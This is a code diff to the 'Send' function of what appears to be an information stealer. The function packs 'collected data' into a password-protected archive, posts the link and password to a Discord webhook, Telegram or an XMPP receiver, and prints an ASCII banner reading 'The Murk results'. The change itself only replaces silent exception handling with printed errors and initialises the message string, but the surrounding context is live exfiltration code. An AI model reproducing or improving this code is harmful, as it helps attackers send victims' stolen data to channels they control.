@@ -37,9 +37,10 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 			arr.close()
 		try:
 			os.remove(f'{np[0]}.zip')
-		except:
-			pass
+		except Exception as e:
+			print(e)
 		print(url)
+		message = ''
 		try:
 			if type == 0:
 				title = f"▀▀█▀▀ █──█ █▀▀ 　 ░█▀▄▀█ █──█ █▀▀█ █─█ 　 █▀▀█ █▀▀ █▀▀ █──█ █── ▀▀█▀▀ █▀▀\n─░█── █▀▀█ █▀▀ 　 ░█░█░█ █──█ █▄▄▀ █▀▄ 　 █▄▄▀ █▀▀ ▀▀█ █──█ █── ──█── ▀▀█\n─░█── ▀──▀ ▀▀▀ 　 ░█──░█ ─▀▀▀ ▀─▀▀ ▀─▀ 　 ▀─▀▀ ▀▀▀ ▀▀▀ ─▀▀▀ ▀▀▀ ──▀── ▀▀▀\n[Link🔗]({url})\nPassword: ||{np[1]}||\n\n>>> **Collected data**"
@@ -59,8 +60,8 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 			if dataF:
 				for text in dataF:
 					message+= text
-		except:
-			pass
+		except Exception as e:
+			print(e)
 		try:
 			if type == 0:
 				urlWebHook = discordData[0] # url of your WebHook
@@ -88,7 +89,7 @@ def Send(type,np,data,dataB,dataO,dataW,dataF,discordData,TelegramData,xmppData)
 				connection.connect()
 				connection.auth(user=jid.getNode(), password=jabberpassword, resource=jid.getResource())
 				connection.send(xmpp.protocol.Message(to=jabberreceiver, body=message))
-		except:
-			pass
-	except:
-		pass
+		except Exception as e:
+			print(e)
+	except Exception as e:
+			print(e)	
